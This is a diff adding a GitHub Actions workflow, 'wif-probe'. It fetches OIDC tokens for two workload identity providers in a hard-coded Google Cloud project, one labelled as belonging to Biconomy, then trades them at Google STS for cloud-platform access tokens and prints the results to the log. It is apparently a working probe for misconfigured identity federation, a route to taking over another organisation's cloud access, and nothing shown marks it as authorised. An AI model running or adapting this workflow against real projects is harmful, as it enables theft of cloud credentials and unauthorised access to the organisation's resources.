@@ -1,0 +1,27 @@
+name: wif-probe
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Get OIDC token for biconomy provider
+        run: |
+          echo "---- provider github-actions-wif-provider ----"
+          OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https%3A%2F%2Fiam.googleapis.com%2Fprojects%2F334188102066%2Flocations%2Fglobal%2FworkloadIdentityPools%2Fgithub-pool%2Fproviders%2Fgithub-actions-wif-provider")
+          echo "$OIDC" | cut -d. -f2 | base64 -d 2>/dev/null || echo "$OIDC"
+          echo "---- STS exchange 1 ----"
+          TOKEN=$(echo "$OIDC" | jq -r .value)
+          curl -s -X POST https://sts.googleapis.com/v1/token \
+            -H "Content-Type: application/json" \
+            -d "{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"audience\":\"//iam.googleapis.com/projects/334188102066/locations/global/workloadIdentityPools/github-pool/providers/github-actions-wif-provider\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"requested_token_type\":\"urn:ietf:params:oauth:token-type:access_token\",\"subject_token\":\"$TOKEN\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:jwt\"}"
+          echo ""
+          echo "---- provider ga-bundler ----"
+          OIDC2=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https%3A%2F%2Fiam.googleapis.com%2Fprojects%2F334188102066%2Flocations%2Fglobal%2FworkloadIdentityPools%2Fgithub-pool%2Fproviders%2Fga-bundler")
+          TOKEN2=$(echo "$OIDC2" | jq -r .value)
+          curl -s -X POST https://sts.googleapis.com/v1/token \
+            -H "Content-Type: application/json" \
+            -d "{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"audience\":\"//iam.googleapis.com/projects/334188102066/locations/global/workloadIdentityPools%2Fgithub-pool%2Fproviders%2Fga-bundler\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"requested_token_type\":\"urn:ietf:params:oauth:token-type:access_token\",\"subject_token\":\"$TOKEN2\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:jwt\"}"
